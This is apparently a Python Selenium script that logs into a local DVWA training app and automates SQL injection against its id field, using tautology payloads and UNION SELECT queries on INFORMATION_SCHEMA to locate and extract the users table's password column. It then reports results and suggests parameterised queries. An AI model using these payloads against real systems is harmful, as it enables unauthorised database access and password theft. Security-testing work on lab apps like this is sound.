from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from fileParser import *


class Injection:
    def __init__(self, num_params, table_name, prevention_type, injection_list, driver):
        self.columns = []
        self.successful_injection = 0  # Count number of successful injections, the first injection is always successful as "1" is a valid user ID
        self.max_columns = num_params  # Assume that we know the return output will consist of 2 values (firstname and surname)
        self.table = table_name
        self.current_injection = 0
        self.prevention_type = prevention_type
        self.injection_list = injection_list
        self.max_injections = len(self.injection_list)
        self.injections = []
        self.final_param = ""
        self.driver = driver
        self.prepare_injections()
        self.login()  # Login first with username and password to access site
        self.force_low_security()  # Try to inject on low security first
        self.get_injection_var()

    @staticmethod
    def login():
        # Login to DVWA server using predefined username and password
        username = driver.find_element_by_name("username")
        password = driver.find_element_by_name("password")
        login_btn = driver.find_element_by_name("Login")

        username.send_keys("admin")
        password.send_keys("password")
        login_btn.send_keys(Keys.RETURN)

    def force_low_security(self):
        driver.get("http://localhost/dvwa/vulnerabilities/sqli/")
        driver.delete_cookie("security")
        if self.prevention_type == 0:
            vulnerability = "low"
        elif self.prevention_type == 1:
            vulnerability = "medium"
        else:
            vulnerability = "impossible"
        cookie = {"name": "security", "value": vulnerability}
        driver.add_cookie(cookie)
        driver.get("http://localhost/dvwa/vulnerabilities/sqli/")

    @staticmethod
    def is_not_error(string):
        return 'error' not in string

    @staticmethod
    def contain_error(list):
        for el in list:
            if 'error' in el:
                return True
        return False

    @staticmethod
    def inject_success(output):  # Number of <pre> tags must be over 1 to be called a successful injection
        return len(output) > 1

    def get_current_injection(self):
        return self.injections[self.current_injection]

    def get_num_params(self, param_name):
        string_concat = ""
        if self.max_columns == 0:
            return "*"
        else:
            for i in range(self.max_columns-1):
                string_concat += "NULL, "
            string_concat += param_name
            return string_concat

    def get_injection_string(self):
        string_concat = ""

        raw_injection_string = self.injection_list[self.current_injection]
        if isinstance(raw_injection_string, list):
            for elem in raw_injection_string:
                if elem == "guess_param":
                    if self.table == "users":
                        string_concat += "password"
                elif elem == "params":
                    string_concat += self.get_num_params("COLUMN_NAME")
                elif elem == "table_name":
                    string_concat += self.table
                elif elem == "param_guess":
                    string_concat += self.get_num_params(self.final_param)
                else:
                    string_concat += elem
        else:
            string_concat += raw_injection_string
        return string_concat

    def update_injections(self, output):
        if self.contain_error(output):
            self.driver.back()
        if self.is_not_error(output):
            if self.prevention_type == 0:
                if self.current_injection == len(self.injection_list) - 1:
                    password_name_tag = output[len(output)-1].split("<br>")[-1]
                    self.final_param = password_name_tag.split(":")[-1].strip()
            if self.inject_success(output):
                self.successful_injection += 1
            if self.current_injection != self.max_injections:  # self.get_injection_string() look at the next iteration
                self.injections.append(self.get_injection_string())
            self.current_injection += 1

    def get_injection_var(self):
        while self.current_injection <= self.max_injections:
            injection = self.get_current_injection()
            if len(self.columns) != 0:
                self.inject(injection)
                break
            self.update_injections(self.inject(injection))

    def prepare_injections(self):
        self.injections.append("1")

    @staticmethod
    def inject(injecting_string):
        # Inject with string
        input_field = driver.find_element_by_name("id")
        submit_btn = driver.find_element_by_name("Submit")
        input_field.clear()
        input_field.send_keys(injecting_string)
        submit_btn.send_keys(Keys.RETURN)
        print("inject string is: " + injecting_string)

        # Try to read output
        val_list = []
        vulnerable_class = driver.find_elements_by_tag_name("pre")
        for val in vulnerable_class:
            # print("Value is: %s" % val.get_attribute("innerHTML"))
            val_list.append(val.get_attribute("innerHTML"))
        return val_list


def test_injections(output_dict):
    assert output_dict["impossible"] == output_dict["low"]


def set_injections():
    injection = ["' OR 1=1#", "1 OR 1=1", ["1' OR 1=1 UNION SELECT ", "params", " FROM INFORMATION_SCHEMA.COLUMNS=",
                                           "table_name", " WHERE COLUMN_NAME LIKE '", "guess_param", "'#"],
                 ["1' OR 1=1 UNION SELECT ", "param_guess", " FROM ", "table_name", "#"]]
    return injection


def printer(injection):
    print('=' * 100)
    print('Finished injecting')
    print()
    print('Out of total ' + str(len(injection.injection_list)) + ' potential injections, ' +
          str(injection.successful_injection) + ' were successful.')
    print()
    if injection.successful_injection > 0:
        if injection.prevention_type == 0:
            print('You were not using any mean of protection. Consider implementing prevention toward SQL injection.')
            print('Use measures such as parameterised query!')
        elif injection.prevention_type == 1:
            print('You use mysql_real_escape_string() as a prevention, but it is not being used in a proper way.')
    else:
        print('Your code is well protected against SQL injection.')


def main():
    global driver
    driver = webdriver.Chrome()
    driver.get("http://localhost/dvwa/vulnerabilities/sqli/")
    parser = Parser(input("file path: "))
    injections = set_injections()
    injection = Injection(parser.num_params_output, parser.table_name, parser.prevention_type, injections, driver)
    printer(injection)
    driver.close()


if __name__ == "__main__":
    main()
